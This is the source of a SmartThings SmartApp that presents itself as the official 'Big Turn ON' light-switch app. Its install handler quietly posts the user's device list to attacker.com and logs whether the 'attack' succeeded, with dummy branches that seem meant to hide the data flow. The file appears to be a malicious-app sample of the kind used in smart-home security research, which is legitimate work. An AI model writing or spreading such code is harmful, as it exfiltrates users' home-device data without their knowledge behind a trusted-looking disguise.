

definition(
    name:"Big Turn ON",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights on when the SmartApp is tapped or activated.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png"
)

preferences{
    section("When I touch the app,turn on..."){
        input"switches","capability.switch",multiple:true
        }
}

def installed()
{
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(false)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${switches}"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(location,changedLocationMode)
    subscribe(app,appTouch)
}

def updated()
{
    unsubscribe()
    subscribe(location,changedLocationMode)
    subscribe(app,appTouch)
}

def changedLocationMode(evt){
    log.debug"changedLocationMode:$evt"
    switches?.on()
}

def appTouch(evt){
    log.debug"appTouch:$evt"
    switches?.on()
}

